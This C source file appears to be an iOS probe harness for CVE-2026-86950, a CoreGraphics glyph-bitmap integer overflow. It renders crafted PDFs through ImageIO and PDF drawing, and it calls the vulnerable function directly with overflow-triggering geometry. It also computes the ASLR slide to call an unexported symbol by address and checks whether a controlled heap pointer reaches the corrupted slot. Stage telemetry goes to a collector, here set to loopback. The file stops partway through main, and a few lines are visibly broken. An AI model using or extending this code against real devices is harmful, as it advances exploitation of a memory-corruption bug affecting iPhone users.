/*
 * probe_cg86950_v13.c - extended run of CVE-2026-86950 (after analysing the public PoC).
 *
 * What changed relative to v2:
 *  1) PDF variants with different MediaBox (200 / 2 000 000 / 20 000 000) - testing the
 *     hypothesis that the iOS renderer clips text to the page bounds and the glyph
 *     (x ~ 1 023 718 device-px) never reaches the vulnerable aa_double_to_fixed.
 *  2) Every variant is rendered TWICE: through the ImageIO preview and through
 *     CGPDFDocument + DrawPDFPage.
 *  3) Path C - a direct call to CGGlyphBitmapCreateWithPathAndDilation with the correct
 *     geometry, computed from the public gen_font.py:
 *         SCALE^9 = 511.859, UPM=16384, Tf=1024  =>  device = units * 511.859/16
 *         rect  DX=33 -> 1055.7 px  (>1015 => malloc/heap)
 *         rect  DX=31 ->  991.7 px  (<=1015 => alloca/stack)
 *         trigger line x = 32000*511.859/16 = 1 023 718.8  => 4096*x = 4.19e9 > 2^31
 *
 * Publication note: the `pdf7_*.h` includes below are generated fixture arrays and the
 * collection/reporting endpoint this probe was driven by is a private host. Here the
 * endpoint constants are replaced with loopback placeholders and the fixtures are left
 * for the reader to generate; everything else is the code that ran.
 */
typedef void *id;
typedef const void *CFStringRef;
typedef unsigned long size_t;
typedef unsigned char uint8_t;
typedef unsigned long uintptr_t;
typedef double CGFloat;

extern void *dlsym(void *handle, const char *symbol);
extern void *dlopen(const char *path, int mode);
extern int socket(int, int, int);
extern int connect(int, const void *, unsigned int);
extern long send(int, const void *, unsigned long, int);
extern int usleep(unsigned int);
extern long read(int, void *, unsigned long);
extern int mkdir(const char *, unsigned int);
static size_t my_strlen(const char *s) { size_t n = 0; while (s[n]) n++; return n; }
extern int pthread_setname_np(const char *);
extern void abort(void);
extern int getsockopt(int, int, int, void *, unsigned int);
extern long recv(int, void *, unsigned long, int);
extern int close(int);
extern int open(const char *, int, ...);
extern int write(int, const void *, unsigned long);
extern int syslog(int, const char *, ...);
extern char *getenv(const char *);
extern int fcntl(int, int, ...);
extern void *malloc(unsigned long);
extern void free(void *);
extern size_t strlen(const char *);
extern int sigaction(int, const void *, void *);
extern int sigsetjmp(void *, int);
extern void siglongjmp(void *, int);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_join(void *, void **);
extern int pthread_attr_init(void *);
extern int pthread_attr_setstacksize(void *, unsigned long);
extern int pthread_attr_destroy(void *);

#define NULL ((void *)0)
#define RTLD_NOW 2
#define RTLD_LOCAL 0
#define O_WRONLY 0x0001
#define O_CREAT 0x0200
#define O_TRUNC 0x0400
#define O_APPEND 0x0008   /* Darwin: O_NONBLOCK=0x4, O_APPEND=0x8 */
#define F_GETFL 3
#define F_SETFL 4
#define O_NONBLOCK 0x0004
#define SIGSEGV 11
#define SIGBUS 10
#define SIGABRT 6
#define SA_SIGINFO 4
#define SA_RESTART 0x10000000

typedef struct { int si_signo, si_errno, si_code; int _pad; void *si_addr; } my_siginfo_t;
typedef void (*sighandler_t)(int, my_siginfo_t *, void *);
typedef struct { void *handler; unsigned long flags; void *restorer; unsigned long mask; } my_sigaction_t;
typedef struct { long __opaque[16]; } pthread_attr_t;


/* Loopback placeholder: point this at your own collector to reuse the telemetry path. */
static const unsigned char g_ip[4] = {127, 0, 0, 1};
static unsigned short g_port = 8801;
static char g_home[512];
static char g_tmp[512];

/* --- run config from the collector: variant=public|small|wide|huge|wideat0, size=N, stack=N --- */
extern int atoi(const char *);
extern char *strstr(const char *, const char *);
extern char *strchr(const char *, int);

#include "pdf7_public.h"
#include "pdf7_small.h"
#include "pdf7_wide.h"
#include "pdf7_huge.h"
#include "pdf7_wideat0.h"
#include "pdf7_dx31.h"
#include "pdf7_dx33.h"
#include "pdf7_dx40.h"
#include "pdf7_x16k.h"
#include "pdf7_x04k.h"
#include "pdf7_x08k.h"
#include "pdf7_benign.h"
#include "pdf7_n1.h"
#include "pdf7_plain.h"
#include "pdf7_plain9.h"
static void report(const char *fmt, ...);
static char g_cfg_variant[32] = "public";
static int g_cfg_size = 64;
static int g_cfg_stack = 1024 * 1024;


/* --- telemetry: report the current stage to the config endpoint (syslog on iOS is rate-limited) --- */
static void ping_cfg(const char *stage) {
    int fd = socket(2, 1, 0);
    if (fd < 0) return;
    unsigned char sa[16];
    sa[0] = 2; sa[1] = 0;
    sa[2] = (unsigned char)((8802 >> 8) & 0xff); sa[3] = (unsigned char)(8802 & 0xff);
    sa[4] = g_ip[0]; sa[5] = g_ip[1]; sa[6] = g_ip[2]; sa[7] = g_ip[3];
    for (int k = 8; k < 16; k++) sa[k] = 0;
    int fl = fcntl(fd, 3 /*F_GETFL*/, 0);
    fcntl(fd, 4 /*F_SETFL*/, fl | 0x0004 /*O_NONBLOCK on Darwin!*/);
    if (connect(fd, sa, 16) != 0) {
        int err = 0; unsigned int elen = 4; int waited = 0; int ok = 0;
        while (waited < 1500) {
            usleep(100000); waited += 100;
            if (getsockopt(fd, 1 /*SOL_SOCKET*/, 4 /*SO_ERROR*/, &err, &elen) == 0 && err == 0) { ok = 1; break; }
        }
        if (!ok) { close(fd); return; }
    }
    fcntl(fd, 4, fl);
    char req[320];
    int n = __builtin_snprintf(req, sizeof(req),
        "GET /log?variant=%s&size=%d&stage=%s HTTP/1.0\r\nHost: x\r\n\r\n",
        g_cfg_variant, g_cfg_size, stage);
    if (n > 0) send(fd, req, (unsigned long)n, 0);
    usleep(60000);
    close(fd);
}

static void fetch_cfg(void) {
    int fd = socket(2, 1, 0);
    if (fd < 0) return;
    unsigned char sa[16];
    sa[0] = 2; sa[1] = 0;
    sa[2] = (unsigned char)((8802 >> 8) & 0xff); sa[3] = (unsigned char)(8802 & 0xff);
    sa[4] = g_ip[0]; sa[5] = g_ip[1]; sa[6] = g_ip[2]; sa[7] = g_ip[3];
    for (int k = 8; k < 16; k++) sa[k] = 0;
    /* NON-BLOCKING connect: the phone must not hang (otherwise watchdog 0x8badf00d) */
    int fl = fcntl(fd, 3 /*F_GETFL*/, 0);
    fcntl(fd, 4 /*F_SETFL*/, fl | 0x0004 /*O_NONBLOCK on Darwin!*/);
    int rc = connect(fd, sa, 16);
    if (rc != 0) {
        int err = 0; unsigned int elen = 4; int waited = 0; int ok = 0;
        while (waited < 2000) {
            usleep(100000); waited += 100;
            if (getsockopt(fd, 1 /*SOL_SOCKET*/, 4 /*SO_ERROR*/, &err, &elen) == 0 && err == 0) { ok = 1; break; }
        }
        if (!ok) { close(fd); report("CFG: connect failed/timeout"); return; }
    }
    fcntl(fd, 4, fl);
    const char *req = "GET /probe.txt HTTP/1.0\r\nHost: collector\r\n\r\n";
    send(fd, req, (unsigned long)strlen(req), 0);
    char buf[1024];
    long n = recv(fd, buf, sizeof(buf) - 1, 0);
    close(fd);
    if (n <= 0) return;
    buf[n] = 0;
    char *body = strstr(buf, "\r\n\r\n");
    if (body) body += 4;
    char *p = body ? body : buf;
    char *nl;
    while ((nl = strchr(p, '\n'))) {
        *nl = 0;
        if (!__builtin_strncmp(p, "variant=", 8)) {
            size_t k = 0;
            while (p[8 + k] && p[8 + k] != 13 && k < 30) { g_cfg_variant[k] = p[8 + k]; k++; }
            g_cfg_variant[k] = 0;
        } else if (!__builtin_strncmp(p, "size=", 5)) g_cfg_size = atoi(p + 5);
        else if (!__builtin_strncmp(p, "stack=", 6)) g_cfg_stack = atoi(p + 6);
        p = nl + 1;
    }
    report("CFG: variant=%s size=%d stack=%d", g_cfg_variant, g_cfg_size, g_cfg_stack);
    ping_cfg("cfg");
}


static void report(const char *fmt, ...) {
    char buf[700];
    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);
    int n = __builtin_vsnprintf(buf, sizeof(buf), fmt, ap);
    __builtin_va_end(ap);
    if (n <= 0) return;
    syslog(1, "%s", buf);
    char path[600];
    size_t i = 0;
    while (g_home[i] && i < 300) { path[i] = g_home[i]; i++; }
    path[i] = 0;
    size_t l = 0;
    while (path[l] && l < 400) l++;
    const char *sfx = "/Documents/probe_cg86950.log";
    size_t s = 0;
    while (sfx[s] && l < 590) { path[l++] = sfx[s++]; }
    path[l] = 0;
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd >= 0) { write(fd, buf, (unsigned long)n); write(fd, "\n", 1); close(fd); }
    int fd2 = socket(2, 1, 0);
    if (fd2 >= 0) {
        int fl = fcntl(fd2, F_GETFL, 0);
        fcntl(fd2, F_SETFL, fl | O_NONBLOCK);
        unsigned char sa[16];
        sa[0] = 2; sa[1] = 0;
        sa[2] = (unsigned char)((g_port >> 8) & 0xff);
        sa[3] = (unsigned char)(g_port & 0xff);
        sa[4] = g_ip[0]; sa[5] = g_ip[1]; sa[6] = g_ip[2]; sa[7] = g_ip[3];
        for (int k = 8; k < 16; k++) sa[k] = 0;
        if (connect(fd2, sa, 16) == 0) { send(fd2, buf, (unsigned long)n, 0); close(fd2); }
    }
}

static char g_jmpbuf[2048];
static volatile unsigned long long g_fault_addr;
static volatile int g_faulted, g_fault_sig;

static void inproc_handler(int sig, my_siginfo_t *info, void *ctx) {
    (void)ctx;
    g_fault_sig = sig;
    g_fault_addr = (unsigned long long)(uintptr_t)(info ? info->si_addr : 0);
    g_faulted = 1;
    siglongjmp(g_jmpbuf, 1);
}

static void *g_iokit, *g_cf, *g_cg;
static id (*CFURLCreateFromFileSystemRepresentation)(id, const uint8_t *, long, int);
static id (*CGImageSourceCreateWithURL)(CFStringRef, void *);
static id (*CGImageSourceCreateThumbnailAtIndex)(id, size_t, void *);
static int (*CGImageSourceGetStatus)(id);
static id (*CFDictionaryCreate)(id, const void **, const void **, size_t, const void *, const void *);
static id (*CFNumberCreate)(id, int, const void *);
static void (*CFRelease)(id);
static id (*CGPDFDocumentCreateWithURL)(CFStringRef, void *);
static id (*CGPDFDocumentGetPage)(id, size_t);
static id (*CGBitmapContextCreate)(void *, size_t, size_t, size_t, size_t, void *, unsigned int);
static id (*CGContextDrawPDFPage)(void *, id);
static void *(*CGColorSpaceCreateDeviceGray)(void);
static id (*CGPathCreateMutable)(void *);
static void (*CGPathMoveToPoint)(void *, const void *, CGFloat, CGFloat);
static void (*CGPathAddLines)(void *, const void *, const void *, size_t);
static id (*CGGlyphBitmapCreateWithPathAndDilation)(id, void *, CGFloat, CGFloat, int, void *, unsigned int, void *, void *);

static void load_syms(void) {
    CFURLCreateFromFileSystemRepresentation = (id (*)(id, const uint8_t *, long, int))dlsym(g_cf, "CFURLCreateFromFileSystemRepresentation");
    CGImageSourceCreateWithURL = (id (*)(CFStringRef, void *))dlsym(g_iokit, "CGImageSourceCreateWithURL");
    CGImageSourceCreateThumbnailAtIndex = (id (*)(id, size_t, void *))dlsym(g_iokit, "CGImageSourceCreateThumbnailAtIndex");
    CGImageSourceGetStatus = (int (*)(id))dlsym(g_iokit, "CGImageSourceGetStatus");
    CFDictionaryCreate = (id (*)(id, const void **, const void **, size_t, const void *, const void *))dlsym(g_cf, "CFDictionaryCreate");
    CFNumberCreate = (id (*)(id, int, const void *))dlsym(g_cf, "CFNumberCreate");
    CFRelease = (void (*)(id))dlsym(g_cf, "CFRelease");
    CGPDFDocumentCreateWithURL = (id (*)(CFStringRef, void *))dlsym(g_cg, "CGPDFDocumentCreateWithURL");
    CGPDFDocumentGetPage = (id (*)(id, size_t))dlsym(g_cg, "CGPDFDocumentGetPage");
    CGBitmapContextCreate = (id (*)(void *, size_t, size_t, size_t, size_t, void *, unsigned int))dlsym(g_cg, "CGBitmapContextCreate");
    CGContextDrawPDFPage = (id (*)(void *, id))dlsym(g_cg, "CGContextDrawPDFPage");
    CGColorSpaceCreateDeviceGray = (void *(*)(void))dlsym(g_cg, "CGColorSpaceCreateGray");
    CGPathCreateMutable = (id (*)(void *))dlsym(g_cg, "CGPathCreateMutable");
    CGPathMoveToPoint = (void (*)(void *, const void *, CGFloat, CGFloat))dlsym(g_cg, "CGPathMoveToPoint");
    CGPathAddLines = (void (*)(void *, const void *, const void *, size_t))dlsym(g_cg, "CGPathAddLines");
    CGGlyphBitmapCreateWithPathAndDilation = (id (*)(id, void *, CGFloat, CGFloat, int, void *, unsigned int, void *, void *))dlsym(g_cg, "CGGlyphBitmapCreateWithPathAndDilation");
}

static id g_rtkey = 0;
static id rtkey(void) {
    if (g_rtkey) return g_rtkey;
    id (*mk)(id, const char *, unsigned int) =
        (id (*)(id, const char *, unsigned int))dlsym(g_cf, "CFStringCreateWithCString");
    if (!mk) return 0;
    g_rtkey = mk(NULL, "KC27RTKEY", 0x08000100u /* kCFStringEncodingUTF8 */);
    return g_rtkey;
}

static id mkdict_thumb(int sz, int mode) {
    /* IMPORTANT: these are EXPORTED VARIABLES, not functions.
       dlsym returns the address of the variable -> the value lives at that address. */
    const void *keyCB = *(const void **)dlsym(g_cf, "kCFTypeDictionaryKeyCallBacks");
    const void *valCB = *(const void **)dlsym(g_cf, "kCFTypeDictionaryValueCallBacks");
    const void *kThumb = *(const void **)dlsym(g_iokit, "kCGImageSourceCreateThumbnailFromImageAlways");
    const void *kMax = *(const void **)dlsym(g_iokit, "kCGImageSourceThumbnailMaxPixelSize");
    const void *kTrue = *(const void **)dlsym(g_cf, "kCFBooleanTrue");
    const void *keys[3]; const void *vals[3]; size_t n = 2;
    id num = CFNumberCreate(NULL, 9, &sz);
    if (mode == 6) {
        /* swapped keys: if the corrupted value is taken from the key array,
           the faulting pc must move from &kThumb to &kMax */
        keys[0] = kMax; vals[0] = num;
        keys[1] = kThumb; vals[1] = kTrue;
    } else if (mode == 2) {
        /* third key - our runtime object: if it ends up in the corrupted slot,
           we have obtained a write of an arbitrary (heap) pointer */
        keys[0] = kThumb; vals[0] = kTrue;
        keys[1] = kMax; vals[1] = num;
        keys[2] = rtkey(); vals[2] = kTrue;
        n = 3;
    } else {
        keys[0] = kThumb; vals[0] = kTrue;
        keys[1] = kMax; vals[1] = num;
    }
    id d = CFDictionaryCreate(NULL, keys, vals, n, keyCB, valCB);
    if (num) CFRelease(num);
    return d;
}

static int g_harness_mode = 0;
static char g_path[600];
static const char *g_variant = "";

static int do_imageio(const char *path) {
    if (!CGImageSourceCreateWithURL || !CGImageSourceCreateThumbnailAtIndex) { report("no iokit syms"); return -1; }
    id url = CFURLCreateFromFileSystemRepresentation(NULL, (const uint8_t *)path, (long)strlen(path), 0);
    if (!url) { report("url fail"); return -1; }
    id src = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    if (!src) { report("source fail"); return -1; }
    report("IOIO %s: status=%d", g_variant, CGImageSourceGetStatus ? CGImageSourceGetStatus(src) : -1);
    int niter = (g_harness_mode == 5) ? 1 : 5;
    for (int si = 0; si < niter; si++) {
        int sz = g_cfg_size;
        id opts = (g_harness_mode == 4) ? 0 : mkdict_thumb(sz, g_harness_mode);
        id img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
        report("IOIO %s: thumb %d -> %p", g_variant, sz, img);
        if (img) CFRelease(img);
        if (opts) CFRelease(opts);
    }
    CFRelease(src);
    return 0;
}

static int do_pdfpage(const char *path) {
    if (!CGPDFDocumentCreateWithURL || !CGPDFDocumentGetPage || !CGBitmapContextCreate || !CGContextDrawPDFPage) {
        report("no cg syms"); return -1;
    }
    id url = CFURLCreateFromFileSystemRepresentation(NULL, (const uint8_t *)path, (long)strlen(path), 0);
    if (!url) return -1;
    id doc = CGPDFDocumentCreateWithURL(url, NULL);
    CFRelease(url);
    if (!doc) { report("PDFDocument fail %s", g_variant); return -1; }
    id page = CGPDFDocumentGetPage(doc, 1);
    if (!page) { report("no page %s", g_variant); CFRelease(doc); return -1; }
    void *cs = CGColorSpaceCreateDeviceGray ? CGColorSpaceCreateDeviceGray() : NULL;
    for (int s = 256; s <= 8192; s *= 4) {
        id ctx = CGBitmapContextCreate(NULL, (size_t)s, (size_t)s, 8, (size_t)s, cs, 0);
        if (!ctx) { report("ctx %d fail", s); continue; }
        report("PDFPAGE %s: draw at %d px ...", g_variant, s);
        CGContextDrawPDFPage(ctx, page);
        report("PDFPAGE %s: drew %d px ok", g_variant, s);
        CFRelease(ctx);
    }
    CFRelease(page);
    CFRelease(doc);
    return 0;
}

/* Path C: a direct call to the vulnerable entry point with the correct geometry */
static int do_direct(int variant) {
    if (!CGGlyphBitmapCreateWithPathAndDilation || !CGPathCreateMutable) {
        report("C: no CGGlyphBitmapCreateWithPathAndDilation sym"); return -1;
    }
    double rects[3] = { 991.7, 1055.7, 1279.6 };
    double xbig = 1023718.8;
    for (int vi = 0; vi < 3; vi++) {
        double w = rects[vi];
        id path = CGPathCreateMutable(NULL);
        CGFloat rect[8] = { 0, 0, w, 0, w, 40, 0, 40 };
        CGPathMoveToPoint(path, NULL, 0, 0);
        CGPathAddLines(path, NULL, rect, 4);
        CGFloat line[4] = { xbig, 1, xbig, 39 };
        CGPathMoveToPoint(path, NULL, xbig, 1);
        CGPathAddLines(path, NULL, line, 2);
        void *cs = CGColorSpaceCreateDeviceGray ? CGColorSpaceCreateDeviceGray() : NULL;
        report("C: variant=%d rectw=%.1f xbig=%.1f path=%p", vi, w, xbig, path);
        id glyph = CGGlyphBitmapCreateWithPathAndDilation(path, NULL, 1024.0, 0.0, 0, cs, 0, NULL, NULL);
        report("C: variant=%d -> glyph=%p", vi, glyph);
        if (glyph) CFRelease(glyph);
        if (path) CFRelease(path);
    }
    return 0;
}

/* ---- Path D: a direct call to CGGlyphBitmapCreateWithPathAndDilation_8 by address ----
   The symbol is local (t) => dlsym does not find it. Compute the image slide:
   anchor = dlsym("CGBitmapContextCreate") (runtime), link-time anchor = 0x183c49148
   (from the local CoreGraphics 27.0), target link-time = 0x183d1b0c0. */
typedef struct { double x, y; } kCGSize;
typedef struct { const void *ptr; unsigned long size; } kSpan;
typedef struct { unsigned long val; unsigned char has; } kOptional;
typedef void *(*glyph_fn)(const void *, int, int, const void *, unsigned int, kCGSize,
                          const void *, const void *, kSpan, kOptional);

static int do_direct_addr(void) {
    void *anchor = dlsym(g_cg, "CGBitmapContextCreate");
    if (!anchor) { report("D: no anchor"); return -1; }
    unsigned long long link_anchor = 0x183c49148ULL;
    unsigned long long link_target = 0x183d1b0c0ULL;
    unsigned long long slide = (unsigned long long)anchor - link_anchor;
    unsigned long long target = link_target + slide;
    report("D: anchor=%p slide=0x%llx target=0xllx", anchor, slide, target);
    glyph_fn fn = (glyph_fn)target;
    double rects[3] = { 991.7, 1055.7, 1279.6 };
    double xbig = 1023718.8;
    kCGSize sz = { 0.0, 0.0 };
    for (int vi = 0; vi < 3; vi++) {
        double w = rects[vi];
        id path = CGPathCreateMutable(NULL);
        CGFloat rect[8] = { 0, 0, w, 0, w, 40, 0, 40 };
        CGPathMoveToPoint(path, NULL, 0, 0);
        CGPathAddLines(path, NULL, rect, 4);
        CGFloat line[4] = { xbig, 1, xbig, 39 };
        CGPathMoveToPoint(path, NULL, xbig, 1);
        CGPathAddLines(path, NULL, line, 2);
        void *cs = CGColorSpaceCreateDeviceGray ? CGColorSpaceCreateDeviceGray() : NULL;
        report("D: variant=%d rectw=%.1f xbig=%.1f", vi, w, xbig);
        ping_cfg("D");
        kSpan sp; sp.ptr = 0; sp.size = 0;
        kOptional op; op.val = 0; op.has = 0;
        void *g = fn(path, 0, 0, 0, 0, sz, 0, 0, sp, op);
        report("D: variant=%d -> %p", vi, g);
    }
    return 0;
}

static int g_mode = 0;   /* 0 = imageio, 1 = pdfpage, 2 = direct, 3 = direct-by-address */

static void *worker_thread(void *arg) {
    (void)arg;
    my_sigaction_t sa;
    sa.handler = (void *)inproc_handler;
    sa.flags = SA_SIGINFO | SA_RESTART;
    sa.restorer = 0;
    sa.mask = 0;
    sigaction(SIGSEGV, &sa, 0);
    sigaction(SIGBUS, &sa, 0);
    sigaction(SIGABRT, &sa, 0);
    if (sigsetjmp(g_jmpbuf, 1) == 0) {
        if (g_mode == 0) do_imageio(g_path);
        else if (g_mode == 1) do_pdfpage(g_path);
        else if (g_mode == 2) do_direct(0);
        else do_direct_addr();
        void *blocks[64];
        for (int i = 0; i < 64; i++) blocks[i] = malloc(192 + (unsigned long)(i * 131));
        for (int i = 0; i < 64; i++) free(blocks[i]);
    }
    return 0;
}

static void run_mode(int mode, const char *variant, const char *path) {
    g_mode = mode;
    g_variant = variant;
    size_t i = 0;
    while (path[i] && i < 550) { g_path[i] = path[i]; i++; }
    g_path[i] = 0;
    g_faulted = 0; g_fault_addr = 0; g_fault_sig = 0;
    unsigned char attrbuf[128];
    void *th = 0;
    pthread_attr_t *ap = (pthread_attr_t *)attrbuf;
    if (pthread_attr_init(ap) == 0) {
        pthread_attr_setstacksize(ap, (unsigned long)(g_cfg_stack > 0 ? g_cfg_stack : 1024 * 1024));
        if (pthread_create(&th, ap, worker_thread, 0) != 0) th = 0;
        pthread_attr_destroy(ap);
    }
    if (!th) { report("thread fail"); worker_thread(0); }
    else pthread_join(th, 0);
    report("MODE %d (%s) done: crash=%d sig=%d addr=0x%llx", mode, variant, g_faulted, g_fault_sig, g_fault_addr);
}

static void write_variant(const char *name, const unsigned char *data, unsigned long len) {
    char p[600];
    size_t i = 0;
    while (g_tmp[i] && i < 400) { p[i] = g_tmp[i]; i++; }
    p[i++] = '/';
    size_t j = 0;
    while (name[j] && i < 500) { p[i++] = name[j++]; }
    p[i] = 0;
    int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { report("cannot write %s", p); return; }
    write(fd, data, len);
    close(fd);
    report("variant written: %s (%lu B)", p, len);
}


/* --- case matrix: thread name = case name, deliberate abort at the end --- */
extern int pthread_setname_np(const char *);
extern void abort(void);
typedef struct { const char *name; const char *pdf; int size; int mode; } kCase;
static const kCase kCases[] = {
    { "public_256_std", "public", 256, 0 },
    { "plain9_256_std", "plain9", 256, 0 },
    { "public_1024_std", "public", 1024, 0 },
    { "plain9_1024_std", "plain9", 1024, 0 },
    { "x04k_256_std", "x04k", 256, 0 },
    { "public_512_std", "public", 512, 0 },
    { "public_128_std", "public", 128, 0 },
    { "public_4096_std", "public", 4096, 0 },
    { "public_64_rev", "public", 64, 6 },
    { "public_64_extra", "public", 64, 2 },
    { "public_64_one", "public", 64, 5 },
    { "dx31_256_std", "dx31", 256, 0 },
    { "dx40_256_std", "dx40", 256, 0 },
};
static const int kCasesCount = 13;
static const char *MATRIX_TAG = "v13";


/* --- matrix progress: read the append-only log, resume after the last case started --- */
static char g_logbuf[8192];
static int log_read_all(void) {
    const char *home = getenv("HOME");
    if (!home) return 0;
    char p[600];
    size_t i = 0;
    while (home[i] && i < 300) { p[i] = home[i]; i++; }
    p[i] = 0;
    size_t l = 0;
    while (p[l] && l < 400) l++;
    const char *sfx = "/Documents/probe_cg86950.log";
    size_t s = 0;
    while (sfx[s] && l < 590) { p[l++] = sfx[s++]; }
    p[l] = 0;
    int fd = open(p, 0);
    if (fd < 0) return 0;
    long n = read(fd, g_logbuf, sizeof(g_logbuf) - 1);
    close(fd);
    if (n <= 0) return 0;
    g_logbuf[n] = 0;
    return 1;
}

static int matrix_start_index(void) {
    int start = 0;
    if (!log_read_all()) return 0;
    for (int i = 0; i < kCasesCount; i++) {
        char pat[64];
        __builtin_snprintf(pat, sizeof(pat), "CASE %s %s (", MATRIX_TAG, kCases[i].name);
        const char *q = g_logbuf;
        int found = 0;
        while ((q = strstr(q, pat)) != 0) { found = 1; q++; }
        if (found) start = i + 1;
    }
    return start;
}


/* --- self-check of the option constants: catches exactly that bug (calling the address of a variable) --- */
static int check_opts(void) {
    unsigned int (*CFGetTypeID)(const void *) =
        (unsigned int (*)(const void *))dlsym(g_cf, "CFGetTypeID");
    unsigned int (*CFStringGetTypeID)(void) =
        (unsigned int (*)(void))dlsym(g_cf, "CFStringGetTypeID");
    unsigned int (*CFBooleanGetTypeID)(void) =
        (unsigned int (*)(void))dlsym(g_cf, "CFBooleanGetTypeID");
    const void *symThumb = dlsym(g_iokit, "kCGImageSourceCreateThumbnailFromImageAlways");
    const void *symMax = dlsym(g_iokit, "kCGImageSourceThumbnailMaxPixelSize");
    const void *symTrue = dlsym(g_cf, "kCFBooleanTrue");
    const void *valThumb = symThumb ? *(const void **)symThumb : 0;
    const void *valMax = symMax ? *(const void **)symMax : 0;
    const void *valTrue = symTrue ? *(const void **)symTrue : 0;
    report("CHECK symThumb=%p valThumb=%p symMax=%p valMax=%p symTrue=%p valTrue=%p",
           symThumb, valThumb, symMax, valMax, symTrue, valTrue);
    if (!valThumb || !valMax || !valTrue) { report("CHECK FAIL: null constant"); return -1; }
    /* bug marker: the value of the constant must NOT equal the address of the symbol */
    if (valThumb == symThumb || valMax == symMax || valTrue == symTrue) {
        report("CHECK FAIL: constant value == symbol address (the old bug)");
        return -1;
    }
    if (CFGetTypeID && CFStringGetTypeID) {
        unsigned int t1 = CFGetTypeID(valThumb), t2 = CFGetTypeID(valMax);
        unsigned int ts = CFStringGetTypeID();
        report("CHECK typeIDs thumb=%u max=%u string=%u", t1, t2, ts);
        if (t1 != ts || t2 != ts) { report("CHECK FAIL: not a CFString"); return -1; }
    }
    if (CFGetTypeID && CFBooleanGetTypeID) {
        unsigned int tb = CFGetTypeID(valTrue), tbool = CFBooleanGetTypeID();
        report("CHECK typeIDs bool=%u boolean=%u", tb, tbool);
        if (tb != tbool) { report("CHECK FAIL: not a CFBoolean"); return -1; }
    }
    report("CHECK OK");
    return 0;
}

static void run_cases(void) {
    char name[64];
    if (check_opts() != 0) { pthread_setname_np("CHECK-FAILED"); abort(); }
    int start = matrix_start_index();
    report("FRONTIER start=%d", start);
    for (int ci = start; ci < kCasesCount; ci++) {
        const kCase *c = &kCases[ci];
        /* place the PDF of the selected variant in tmp under its own name */
        char p[600];
        size_t i = 0;
        while (g_tmp[i] && i < 400) { p[i] = g_tmp[i]; i++; }
        p[i++] = '/';
        size_t j = 0;
        while (c->pdf[j] && i < 560) { p[i++] = c->pdf[j++]; }
        p[i] = 0;
        int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0) {
            const unsigned char *data = 0; unsigned long len = 0;
            if (!__builtin_strncmp(c->pdf, "plain9", 6)) { data = kTr7_plain9; len = kTr7_plain9Len; }
            else if (!__builtin_strncmp(c->pdf, "plain", 5)) { data = kTr7_plain; len = kTr7_plainLen; }
            else if (!__builtin_strncmp(c->pdf, "benign", 6)) { data = kTr7_benign; len = kTr7_benignLen; }
            else if (!__builtin_strncmp(c->pdf, "n1", 2)) { data = kTr7_n1; len = kTr7_n1Len; }
            else if (!__builtin_strncmp(c->pdf, "x04k", 4)) { data = kTr7_x04k; len = kTr7_x04kLen; }
            else if (!__builtin_strncmp(c->pdf, "x08k", 4)) { data = kTr7_x08k; len = kTr7_x08kLen; }
            else if (!__builtin_strncmp(c->pdf, "x16k", 4)) { data = kTr7_x16k; len = kTr7_x16kLen; }
            else if (!__builtin_strncmp(c->pdf, "dx31", 4)) { data = kTr7_dx31; len = kTr7_dx31Len; }
            else if (!__builtin_strncmp(c->pdf, "dx33", 4)) { data = kTr7_dx33; len = kTr7_dx33Len; }
            else if (!__builtin_strncmp(c->pdf, "dx40", 4)) { data = kTr7_dx40; len = kTr7_dx40Len; }
            else if (!__builtin_strncmp(c->pdf, "wideat0", 7)) { data = kTr7_wideat0; len = kTr7_wideat0Len; }
            else if (!__builtin_strncmp(c->pdf, "huge", 4)) { data = kTr7_huge; len = kTr7_hugeLen; }
            else if (!__builtin_strncmp(c->pdf, "wide", 4)) { data = kTr7_wide; len = kTr7_wideLen; }
            else if (!__builtin_strncmp(c->pdf, "small", 5)) { data = kTr7_small; len = kTr7_smallLen; }
            else { data = kTr7_public; len = kTr7_publicLen; }
            write(fd, data, len);
            close(fd);
        }
        __builtin_snprintf(name, sizeof(name), "CASE-%s", c->name);
        pthread_setname_np(name);
        report("CASE %s %s (pdf=%s size=%d) ...", MATRIX_TAG, c->name, c->pdf, c->size);
        int saved = g_cfg_size;
        g_cfg_size = c->size;
        int saved_mode = g_harness_mode;
        g_harness_mode = c->mode;
        do_imageio(p);
        g_cfg_size = saved;
        g_harness_mode = saved_mode;
        report("CASE %s %s survived", MATRIX_TAG, c->name);
    }
    pthread_setname_np("DONE-ALL-CASES-SURVIVED");
    report("ALL CASES SURVIVED");
    abort();
}

int main(void) {
    fetch_cfg();
    const char *home = getenv("HOME");
    const char *tmp = getenv("TMPDIR");
    if (!tmp) tmp = "/tmp";
    size_t i = 0;
    while (home && home[i] && i < 400) { g_home[i] = home[i]; i++; }
    g_home[i] = 0;
    i = 0;
    while (tmp[i] && i < 400) { g_tmp[i] = tmp[i]; i++; }
    g_tmp[i] = 0;

    g_iokit = dlopen("/System/Library/Frameworks/ImageIO.framework/ImageIO", RTLD_NOW);
    g_cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
    g_cg = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", RTLD_NOW);
    load_syms();
    report("CVE86950 v13: start iokit=%p cf=%p cg=%p direct_sym=%p",
           g_iokit, g_cf, g_cg, (void *)CGGlyphBitmapCreateWithPathAndDilation);

    write_variant("public.pdf", kTr7_public, kTr7_publicLen);
    write_variant("small.pdf", kTr7_small, kTr7_smallLen);
    write_variant("wide.pdf", kTr7_wide, kTr7_wideLen);
    write_variant("huge.pdf", kTr7_huge, kTr7_hugeLen);
    write_variant("wideat0.pdf", kTr7_wideat0, kTr7_wideat0Len);
    write_variant("dx31.pdf", kTr7_dx31, kTr7_dx31Len);
    write_variant("dx33.pdf", kTr7_dx33, kTr7_dx33Len);
    write_variant("dx40.pdf", kTr7_dx40, kTr7_dx40Len);
    write_variant("x16k.pdf", kTr7_x16k, kTr7_x16kLen);
    write_variant("x04k.pdf", kTr7_x04k, kTr7_x04kLen);
    write_variant("x08k.pdf", kTr7_x08k, kTr7_x08kLen);
